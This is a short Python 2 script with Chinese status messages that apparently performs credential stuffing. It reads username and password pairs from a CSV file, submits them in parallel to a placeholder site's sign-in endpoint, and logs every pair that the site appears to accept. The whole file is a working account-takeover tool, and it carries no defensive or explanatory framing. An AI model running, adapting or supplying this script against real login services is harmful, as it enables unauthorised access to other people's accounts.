# -*- coding: utf-8 -*-
import csv
import logging
import urllib
import urllib2
from multiprocessing import Pool


def pull(kw):
    try:
        if len(kw) == 2:
            print u'尝试: {} , {}'.format(kw[0], kw[1])
            url = 'http://www.xxxx.com/Account/SignIn'
            data = urllib.urlencode({
                'userName': kw[0],
                'password': kw[1]
            })
            res = urllib2.urlopen(url, data=data)
            content = res.read()
            if 'false' not in content:
                logging.info('{},{}'.format(kw[0], kw[1]))
            else:
                print u'{} {} 错误'.format(kw[0], kw[1])
    except Exception as e:
        print u'他们接口可能挂了，信息是: {}'.format(e.message)


if __name__ == '__main__':
    logging.basicConfig(filename='result.csv', level=logging.INFO, format='%(message)s')
    p = Pool(10)
    allcount = []
    with open('test.csv') as f:
        csf = csv.reader(f)
        for row in csf:
            allcount.append(row)

    p.map(pull, allcount)
